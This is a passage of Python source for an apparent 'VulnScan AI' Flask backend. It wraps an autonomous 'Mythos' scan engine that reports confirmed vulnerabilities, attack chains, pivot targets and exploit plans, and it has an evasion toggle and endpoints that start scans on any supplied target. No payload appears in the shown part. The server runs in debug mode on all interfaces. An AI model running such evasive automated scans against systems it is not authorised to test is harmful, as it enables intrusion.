            'timestamp': datetime.now().isoformat(),
            'observations': obs,
            'hypotheses': len(hypotheses),
            'confirmed_findings': confirmed,
            'uncertain_findings': uncertain,
            'attack_chains': chains,
            'pivot_findings': pivots,
            'exploit_plans': exploit_plans,
            'healing_history': healing_state['healing_history'],
            'self_healing_events': len(healing_state['healing_history'])
        }
        
        self.intel_report = report
        
        # Final summary
        log('green', '='*60)
        log('green', '  MYTHOS AUTONOMOUS SCAN COMPLETE')
        log('green', f'  Hypotheses tested: {len(hypotheses)}')
        log('green', f'  Findings confirmed: {len(confirmed)}')
        log('green', f'  Attack chains built: {len(chains)}')
        log('green', f'  Self-healing events: {len(healing_state["healing_history"])}')
        log('green', f'  Pivot targets found: {len(pivots)}')
        log('green', '='*60)
        
        return report


# ---------------------------------------------------------------------------
# SECTION 3: INTEGRATION FUNCTION - Call this from your run_full_scan
# ---------------------------------------------------------------------------

def run_mythos_autonomous_scan(target):
    """
    Main entry point for the Claud Mythos-inspired autonomous scanner.
    Call this function from run_full_scan() to integrate.
    
    Returns the scan report dictionary.
    """
    log('purple', '[MYTHOS] Initializing Autonomous Scan Engine...')
    
    # Reset healing state for fresh scan
    healing_state['concurrency'] = 15
    healing_state['timeout'] = 10
    healing_state['payload_style'] = 'standard'
    healing_state['evasion'] = False
    healing_state['delays'] = False
    healing_state['healing_attempts'] = 0
    healing_state['healing_history'] = []
    
    engine = MythosEngine(target)
    
    try:
        report = engine.run_autonomous_scan()
        
        # Store Ollama-style insights
        if report and len(report.get('confirmed_findings', [])) > 0:
            chain_summary = "\n".join(
                [f"⛓️ {c['name']}: {' → '.join(c['steps'][:2])}" 
                 for c in report.get('attack_chains', [])]
            )
            insight = (
                f"Mythos Autonomous Scan for {target}:\n"
                f"- Confirmed {len(report['confirmed_findings'])} vulnerabilities\n"
                f"- Built {len(report['attack_chains'])} attack chains\n"
                f"- Self-healed {len(report['healing_history'])} times\n"
                f"- Top chains:\n{chain_summary}"
            )
            scan_state['ollama_insights'].append({
                "tool": "Mythos Autonomous Engine",
                "guidance": insight
            })
        
        return report
        
    except Exception as e:
        log('red', f'[MYTHOS] Fatal error in autonomous scan: {str(e)}')
        traceback.print_exc()
        return None
    finally:
        engine.stop()


# ---------------------------------------------------------------------------
# SECTION 4: FLASK ROUTES (Add these to integrate with web UI)
# ---------------------------------------------------------------------------

@app.route('/mythos_status', methods=['GET'])
def mythos_status():
    """Get the current Mythos engine status and healing history"""
    return jsonify({
        'healing_state': {
            'concurrency': healing_state['concurrency'],
            'timeout': healing_state['timeout'],
            'payload_style': healing_state['payload_style'],
            'evasion': healing_state['evasion'],
            'healing_attempts': healing_state['healing_attempts'],
            'max_healing_attempts': healing_state['max_healing_attempts']
        },
        'healing_history': healing_state['healing_history'][-10:],  # Last 10 events
        'mythos_active': scan_state.get('mythos_active', False)
    })

@app.route('/mythos_scan', methods=['POST'])
def mythos_scan():
    """Trigger a Mythos autonomous scan"""
    data = request.json
    target = data.get('target') or scan_state.get('target')
    
    if not target:
        return jsonify({"error": "No target specified"}), 400
    
    def run_async():
        scan_state['mythos_active'] = True
        try:
            report = run_mythos_autonomous_scan(target)
            if report:
                # Add confirmed findings to global state
                for f in report.get('confirmed_findings', []):
                    sev_map = {'CRITICAL': 'crit', 'HIGH': 'high', 'MEDIUM': 'med', 'LOW': 'low'}
                    add_finding(
                        sev_map.get(f.get('severity', 'MEDIUM'), 'med'),
                        f'[MYTHOS] {f["type"]}: {f.get("evidence", "")[:200]}',
                        asset=f"MYTHOS_{f['type']}_{f.get('param', 'N/A')}",
                        tool='mythos-engine',
                        impact='confidentiality',
                        exploitability='public' if f.get('confirmed') else 'theoretical'
                    )
        finally:
            scan_state['mythos_active'] = False
    
    threading.Thread(target=run_async, daemon=True).start()
    return jsonify({"status": "MYTHOS_SCAN_STARTED", "target": target})



if __name__ == '__main__':
    print("=" * 50)
    print("  VulnScan AI - Backend Server")
    print("  Starting on http://localhost:5000")
    print("=" * 50)
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)